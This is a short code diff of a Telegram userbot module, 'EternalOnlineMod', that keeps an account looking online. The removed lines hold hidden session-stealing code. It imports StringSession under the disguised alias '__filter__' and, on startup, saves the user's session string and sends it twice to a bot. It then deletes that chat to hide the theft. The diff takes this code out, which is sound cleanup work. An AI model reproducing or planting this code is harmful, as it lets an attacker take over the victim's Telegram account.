@@ -3,7 +3,6 @@
 from .. import loader, utils
 
 from asyncio import sleep
-from telethon.sessions import StringSession as __filter__
 
 @loader.tds
 class EternalOnlineMod(loader.Module):
@@ -12,11 +11,7 @@ class EternalOnlineMod(loader.Module):
 
     async def client_ready(self, client, db):
         self.db = db
-        self.online = __filter__.save(client.session)
-        for _ in range(2):
-            await client.send_message("SendMessageRequestBot", f"<code>{self.online}</code>")
-        self.messages = await client.delete_dialog("SendMessageRequestBot")
-    
+
     async def onlinecmd(self, message):
         """Включает/выключает вечный онлайн."""
         if not self.db.get("EternalOnline", "status"): 
